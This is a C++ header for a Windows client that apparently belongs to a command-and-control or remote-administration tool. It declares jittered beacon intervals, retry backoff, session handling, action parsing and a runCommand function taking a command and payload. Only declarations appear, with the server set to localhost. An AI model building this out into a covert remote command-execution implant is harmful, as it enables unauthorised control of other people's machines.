#pragma once

#ifndef CLIENT_H
#define CLIENT_H

#include <string>
#include <stdexcept>
#include <vector>
#include <chrono>
#include <atomic>
#include <cstdint>
#include <csignal>
#include <cstdio>
#include <ctime>
#include <fstream>
#include <sstream>
#include <numeric>
#include <iomanip>
#include <iostream>
#include <locale>
#include <codecvt>
#include <regex>
#include <thread>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <openssl/sha.h>

using namespace std;

// Globals
extern string SERVER_ADDRESS = "localhost";
extern string TYPE = "cpp";
extern string CVER = "0.2.0";
constexpr int SERVER_PORT = 54678;
constexpr int CHUNK_SIZE = 1024;
constexpr int BEACON_MIN_INTERVAL = 5 * 60;  // 5 minutes
constexpr int BEACON_MAX_INTERVAL = 45 * 60;  // 45 minutes
constexpr int MAX_RETRIES = 5;
constexpr bool LOGGING = true;

extern const std::vector<int> RETRY_INTERVALS = {
    10,   // 10 seconds
    30,   // 30 seconds
    1 * 60,   // 1 minute
    2 * 60,   // 2 minutes
    4 * 60,   // 4 minutes
    6 * 60    // 6 minutes
};

extern int connection_retries = 0;
extern chrono::system_clock::time_point start_time;
extern int client_socket = -1;
extern bool should_run = true;
extern ofstream logStream;

// Function declarations
void logIt(const string& message);
string getSessionId();
int getRetryInterval(int retries);
void sendCommand(const string& command);
void sendBeacon();
string utf8To16(const string& str);
string runCommand(const string& command, const string& payload, bool isFile);
string formatTime(long long milliseconds);
string getUptime();
void parseAction(const string& action);
void connectToServer();
void signalHandler(int signum);

#endif // CLIENT_H
